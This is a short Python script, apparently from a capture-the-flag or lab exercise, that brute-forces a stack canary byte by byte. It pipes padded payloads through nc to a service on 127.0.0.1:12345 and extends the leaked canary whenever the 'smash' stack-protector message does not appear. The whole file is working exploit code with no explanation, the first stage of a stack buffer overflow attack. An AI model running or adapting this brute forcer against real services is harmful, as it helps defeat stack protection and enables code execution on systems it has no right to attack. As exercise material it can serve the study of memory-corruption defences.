import subprocess
from subprocess import Popen, PIPE, STDOUT
import os
import math
from time import sleep

canary = b'\x00'
tmp = 0
while True:
    payload = b'a'*10 + canary + (tmp).to_bytes(int(math.ceil((tmp).bit_length() / 8)), byteorder='big')
    p = subprocess.Popen(['nc','127.0.0.1','12345'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)
    output = p.communicate(input=payload)[0]
    if b'smash' not in output:
        canary += (tmp).to_bytes(int(math.ceil((tmp).bit_length() / 8)), byteorder='big')
        print('canary:', canary)
        tmp = 0
    print(payload)
    print("output :", output)
    tmp += 1
    sleep(0.1)